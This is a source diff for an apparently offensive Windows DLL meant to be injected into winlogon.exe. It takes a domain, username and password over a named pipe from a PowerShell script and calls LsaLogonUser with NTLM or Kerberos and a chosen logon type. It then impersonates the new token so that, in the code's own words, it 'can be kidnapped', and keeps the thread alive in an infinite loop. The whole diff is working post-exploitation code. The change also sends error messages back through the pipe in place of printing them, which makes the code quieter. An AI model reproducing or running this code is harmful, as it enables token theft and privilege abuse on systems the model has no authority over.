@@ -7,22 +7,22 @@ using namespace std;
 
 size_t wcsByteLen( const wchar_t* str );
 void InitUnicodeString( UNICODE_STRING& str, const wchar_t* value, BYTE* buffer, size_t& offset );
+PVOID CreateKerbLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size);
 PVOID CreateNtlmLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size);
 size_t WriteUnicodeString(const wchar_t* str, UNICODE_STRING* uniStr, PVOID address);
+void WriteErrorToPipe(string errorMsg, HANDLE pipe);
 
 extern "C" __declspec( dllexport ) void VoidFunc();
 
 
+//The entire point of this code is to call LsaLogonUser from within winlogon.exe
 extern "C" __declspec( dllexport ) void VoidFunc()
 {
-	//Get username/password from named pipe
-	//wofstream outFile;
-	//outFile.open("c:\\temp\\pipe.txt");
-
-	HANDLE pipe = CreateFile(L"\\\\.\\pipe\\p", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	//Open a pipe which will receive data from the PowerShell script.
+	HANDLE pipe = CreateFile(L"\\\\.\\pipe\\sqsvc", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (pipe == INVALID_HANDLE_VALUE)
 	{
-		cout << "Failed to open named pipe" << endl;
+		return;
 	}
 
 	const size_t strSize = 257;
@@ -31,6 +31,7 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	wchar_t* username = new wchar_t[strSize];
 	wchar_t* password = new wchar_t[strSize];
 	DWORD bytesRead = 0;
+
 	BOOL success = ReadFile(pipe, domain, strSize, &bytesRead, NULL);
 	if (!success)
 	{
@@ -52,35 +53,74 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	}
 	password[bytesRead/2] = '\0';
 
-	//wstring final = wstring(domain) + wstring(L"\\") + wstring(username) + wstring(L" : ") + wstring(password);
-	//outFile <<  final;
+	//Get the logon type from the pipe
+	USHORT logonType = 10;
+	success = ReadFile(pipe, &logonType, 1, &bytesRead, NULL);
+	if (!success)
+	{
+		return;
+	}
 
+	//Get the authentication package to use. 1 = Msv1_0, 2 = Kerberos
+	USHORT authPackageToUse = 0;
+	success = ReadFile(pipe, &authPackageToUse, 1, &bytesRead, NULL);
+	if (!success)
+	{
+		return;
+	}
 	
+
+	/////////////
+	//Build the parameters to call LsaLogonUser with
+	/////////////
 
 	//Get a handle to LSA
 	HANDLE hLSA = NULL;
 	NTSTATUS status = LsaConnectUntrusted(&hLSA);
 	if (status != 0)
 	{
-		cout << "Error calling LsaConnectUntrusted. Error code: " << status << endl;
+		string errorMsg = "Error calling LsaConnectUntrusted. Error code: " + to_string(status);
+		WriteErrorToPipe(errorMsg, pipe);
 		return;
 	}
 	if (hLSA == NULL)
 	{
-		cout << "hLSA is NULL, this shouldn't ever happen" << endl;
+		string errorMsg = "hLSA (LSA handle) is NULL, this shouldn't ever happen.";
+		WriteErrorToPipe(errorMsg, pipe);
 		return;
 	}
 
 	//Build LsaLogonUser parameters
 	LSA_STRING originName = {};
-	char originNameStr[] = "qpqp";
+	char originNameStr[] = "";
 	originName.Buffer = originNameStr;
-	originName.Length = (USHORT)strlen(originNameStr);
-	originName.MaximumLength = originName.Length;
+	originName.Length = (USHORT)0;
+	originName.MaximumLength = 0;
+
+	//Build the authentication package parameter based on the auth package the powershell script specified to use
+	//Also get the AuthenticationInformation
+	char* authPackageBuf = NULL;
+	DWORD authBufferSize = 0;
+	PVOID authBuffer = NULL;
+	if (authPackageToUse == 1)
+	{
+		authPackageBuf = MSV1_0_PACKAGE_NAME;
+		authBuffer = CreateNtlmLogonStructure(domain, username, password, &authBufferSize);
+	}
+	else if (authPackageToUse == 2)
+	{
+		authPackageBuf = MICROSOFT_KERBEROS_NAME_A;
+		authBuffer = CreateKerbLogonStructure(domain, username, password, &authBufferSize);
+	}
+	else
+	{
+		string errorMsg = "Received an invalid auth package from the named pipe";
+		WriteErrorToPipe(errorMsg, pipe);
+		return;
+	}
 
 	ULONG authPackage = 0;
 	PLSA_STRING authPackageName = new LSA_STRING();
-	char authPackageBuf[] = MSV1_0_PACKAGE_NAME;
 	authPackageName->Buffer = authPackageBuf;
 	authPackageName->Length = (USHORT)strlen(authPackageBuf);
 	authPackageName->MaximumLength = (USHORT)strlen(authPackageBuf);
@@ -88,12 +128,10 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	if (status != 0)
 	{
 		int winError = LsaNtStatusToWinError(status);
-		cout << "Call to LsaLookupAuthenticationPackage failed. Error code: " << winError;
+		string errorMsg = "Call to LsaLookupAuthenticationPackage failed. Error code: " + to_string(winError);
+		WriteErrorToPipe(errorMsg, pipe);
 		return;
 	}
-
-	DWORD authBufferSize = 0;
-	PVOID authBuffer = CreateNtlmLogonStructure(domain, username, password, &authBufferSize);
 
 	//Get TokenSource
 	HANDLE hProcess = GetCurrentProcess();//todo
@@ -102,7 +140,8 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	if (!success)
 	{
 		DWORD errorCode = GetLastError();
-		cout << "Call to OpenProcessToken failed. Errorcode: " << errorCode << endl;
+		string errorMsg = "Call to OpenProcessToken failed. Errorcode: " + to_string(errorCode);
+		WriteErrorToPipe(errorMsg, pipe);
 		return;
 	}
 
@@ -111,11 +150,12 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	success = GetTokenInformation(procToken, TokenSource, &tokenSource, sizeof(tokenSource), &realSize);
 	if (!success)
 	{
-		cout << "Call to GetTokenInformation failed." << endl;
+		string errorMsg = "Call to GetTokenInformation failed.";
+		WriteErrorToPipe(errorMsg, pipe);
 		return;
 	}
 
-	//Misc
+	//Misc out parameters
 	PVOID profileBuffer = NULL;
 	ULONG profileBufferSize = 0;
 	LUID loginId;
@@ -126,7 +166,7 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	//Log on the user
 	status = LsaLogonUser(hLSA, 
 		&originName, 
-		RemoteInteractive, 
+		static_cast<SECURITY_LOGON_TYPE>(logonType), 
 		authPackage, 
 		authBuffer,
 		authBufferSize, 
@@ -142,17 +182,18 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	if (status != 0)
 	{
 		NTSTATUS winError = LsaNtStatusToWinError(status);
-		cout << "Error calling LsaLogonUser. Error code: " << winError << endl;
+		string errorMsg = "Error calling LsaLogonUser. Error code: " + to_string(winError);
+		WriteErrorToPipe(errorMsg, pipe);
 		return;
 	}
-
-	//cout << "Success!" << endl;
 
 	
 	//Impersonate the token with the current thread so it can be kidnapped
 	ImpersonateLoggedOnUser(token);
 
 	//Put the thread to sleep so it can be impersonated
+	string successMsg = "Logon succeeded, impersonating the token so it can be kidnapped and starting an infinite loop with the thread.";
+	WriteErrorToPipe(successMsg, pipe);
 	HANDLE permenantSleep = CreateMutex(NULL, false, NULL);
 	while(1)
 	{
@@ -162,7 +203,25 @@ extern "C" __declspec( dllexport ) void VoidFunc()
 	return;
 }
 
-//size will be set to the size of the structure created
+
+PVOID CreateKerbLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size)
+{
+	size_t wcharSize = sizeof(wchar_t);
+
+	size_t totalSize = sizeof(KERB_INTERACTIVE_LOGON) + ((lstrlenW(domain) + lstrlenW(username) + lstrlenW(password)) * wcharSize);
+	KERB_INTERACTIVE_LOGON* ntlmLogon = (PKERB_INTERACTIVE_LOGON)(new BYTE[totalSize]);
+	size_t writeAddress = (UINT_PTR)ntlmLogon + sizeof(KERB_INTERACTIVE_LOGON);
+
+	ntlmLogon->MessageType = KerbInteractiveLogon;
+	writeAddress += WriteUnicodeString(domain, &(ntlmLogon->LogonDomainName), (PVOID)writeAddress);
+	writeAddress += WriteUnicodeString(username, &(ntlmLogon->UserName), (PVOID)writeAddress);
+	writeAddress += WriteUnicodeString(password, &(ntlmLogon->Password), (PVOID)writeAddress);
+
+	*size = (DWORD)totalSize; //If the size is bigger than a DWORD, there is a gigantic bug somewhere.
+	return ntlmLogon;
+}
+
+
 PVOID CreateNtlmLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size)
 {
 	size_t wcharSize = sizeof(wchar_t);
@@ -189,4 +248,11 @@ size_t WriteUnicodeString(const wchar_t* str, UNICODE_STRING* uniStr, PVOID addr
 	uniStr->Buffer = (PWSTR)address;
 	memcpy(address, str, size);
 	return size;
+}
+
+void WriteErrorToPipe(string errorMsg, HANDLE pipe)
+{
+	const char* error = errorMsg.c_str();
+	DWORD bytesWritten = 0;
+	WriteFile(pipe, error, strlen(error),  &bytesWritten, NULL);
 }
